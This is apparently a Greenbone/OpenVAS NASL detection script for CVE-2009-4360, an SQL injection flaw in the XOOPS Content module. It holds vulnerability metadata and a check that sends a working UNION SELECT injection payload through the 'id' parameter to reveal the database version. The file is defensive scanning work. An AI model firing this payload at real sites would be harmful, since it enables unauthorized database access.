CPE = "cpe:/a:xoops:xoops";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900732" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-12-24 14:01:59 +0100 (Thu, 24 Dec 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-4360" );
	script_bugtraq_id( 37155 );
	script_name( "XOOPS Content Module SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_xoops_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "XOOPS/installed" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/54489" );
	script_xref( name: "URL", value: "http://securityreason.com/exploitalert/7494" );
	script_xref( name: "URL", value: "http://www.packetstormsecurity.org/0911-exploits/xoopscontent-sql.txt" );
	script_tag( name: "summary", value: "This host is running XOOPS and is prone to SQL Injection
  vulnerability." );
	script_tag( name: "insight", value: "This flaw is due to improper sanitization of data inside 'Content'
  module within the 'id' parameter which lets the remote unauthenticated user to run arbitrary SQL Commands." );
	script_tag( name: "impact", value: "Successful exploitation will let the remote attacker to execute arbitrary SQL
  queires to compromise the remote machine running the vulnerable application." );
	script_tag( name: "affected", value: "XOOPS 'Content' Module 0.5" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/modules/content/index.php?id=1";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "blockContent" ) && ContainsString( res, "blockTitle" )){
	url = dir + "/modules/content/index.php?id=-1+UNION+SELECT+1,2,3,@@version,5,6,7,8,9,10,11--";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "Set-Cookie: " ) && ContainsString( res, "PHPSESSID" ) && ContainsString( res, "path=/" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

